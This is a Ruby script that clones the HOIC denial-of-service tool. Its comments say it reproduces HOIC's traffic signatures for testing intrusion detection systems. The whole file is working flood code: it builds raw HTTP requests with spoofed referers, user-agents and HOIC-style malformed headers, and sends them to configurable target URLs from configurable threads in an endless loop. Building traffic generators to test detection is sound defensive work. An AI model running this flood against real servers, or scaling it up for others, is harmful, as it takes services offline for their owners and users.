# Ruby HOIC Clone
# Instead of .hoic files, just modify the CONFIGURATION section below
#
# The purpose of this isn't do be a good DDoS tool, but to duplicate
# HOIC-specific signatures and allow you to test IDS/IPS systems from
# a command line rather than the normal HOIC gui client.

# This is also my very first ruby attempt so it's probably not written
# as cleanly as could be and there's like zero error checking.

require 'socket'
require 'uri'

$referers = Array.new
$agents = Array.new
$randomheaders = Array.new
$urls = Array.new
$headerappend = Array.new

#### CONFIGURATION ####

$debug = 0
threads = 1
powerfactor = 1  # 1-3, 3 being the fastest
$UsePost = 0

# random url will be selected
$urls << "http://jukebox.office:80"
$urls << "http://jukebox.office/index.html?name=dop"

# all of these headers will be added
$headerappend << "Keep-Alive:  115"
$headerappend << "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7"
$headerappend << "Connection:  keep-alive"

# random referer will be used
# the extra space is here on purpose
$referers << " http://www.google.com/?q=dop"
$referers << " http://www.google.com/?q=mike"

# random user-agent will be used
# the extra space is here on purpose
$agents << " Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)"
$agents << " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"

## HOIC has some strange double spaces in some headers
$randomheaders << "Cache-Control:  no-cache"
$randomheaders << "If-Modified-Since:  Fri, 20 Oct 2008 09:34:27 GMT"

##### END CONFIGURATION ########

def SendAttack
	#Pick a random URL
	if $urls.length > 0
		uri = URI.parse($urls[rand($urls.length)])
		if(uri.path == "")
			uri.path = "/"
		end
	end

	# HOIC uses HTTP/1.0
	# The rest of the request ordering is based on HOIC source and pcaps
	if($UsePost==1)
		request = "POST #{uri.path}"
	else
		request = "GET #{uri.path}"
	end

	## yes, this is wrong in the case of a POST, but it's what HOIC sends
	if(uri.query != nil)
		request << "?#{uri.query}"
	end

	request << " HTTP/1.0\r\n"
	request << "Accept: */*\r\n"
	request << "Accept-Language: en\r\n"

	if $headerappend.length > 0
		for i in 0..($headerappend.length - 1)
			request << $headerappend.at(i) << "\r\n"
		end
	end

	if $referers.length > 0
		request << "Referer: " << $referers[rand($referers.length)] << "\r\n"
	end
	if $agents.length > 0
		request << "User-Agent: " << $agents[rand($agents.length)] << "\r\n"
	end
	if $randomheaders.length > 0
		request << $randomheaders[rand($randomheaders.length)] << "\r\n"
	end

	# HOIC always has the Host header last (which also isn't part of HTTP/1.0)
	if $UsePost==1
		request << "Host: #{uri.host}\r\n"
		request << "Content-type: application/x-www-form-urlencoded\r\n"
	    request << "Content-length: 0\r\n\r\n"

	    ## poorly formatted POSTs are another HOIC signature.

	else
		request << "Host: #{uri.host}\r\n\r\n"
	end

	begin
		# Using direct sockets because of all the weirdness in HOIC headers
		sock = TCPSocket.open(uri.host,uri.port)

		if(defined?(sock))
			sock.print(request)
			response = sock.read   # we should test skipping reading the response.
			sock.close
		end
	rescue
		puts "Socket Error: uri.host ",$!
	end

	## we really don't care about the response, but it's good for testing
#	headers,body = response.split("\r\n\r\n", 2)
#	print body

	return
end

## open threads, deal with power factors and HOIC timing
thread = Array.new
for i in 1..threads
	thread[i]=Thread.new {
		if($debug==1)
			## this isn't really right
			# I should be passing the parameter differently.
			# Also is there a better way to reference a thread-local variable?
			Thread.current[:id] = i 
		end

		while(1) do
			# Timing logic derived from HOIC source

			if (powerfactor==1)
				if($debug == 1)
					puts "#{Thread.current[:id]} sleep 0.250"
				end
				sleep 0.250
			elsif (powerfactor==2)
				if($debug == 1)
					puts "#{Thread.current[:id]} sleep 0.100"
				end
				sleep 0.100
			else
				if($debug == 1)
					puts "#{Thread.current[:id]} sleep 0.50"
				end
				sleep 0.50
			end

			if($debug == 1)
				puts "#{Thread.current[:id]} SendAttack"
			end
			SendAttack()
			sleep (0.50 * (3 - powerfactor))
		end
	}
end

#while(thread[0].alive?)
while(1)
	sleep 1
end




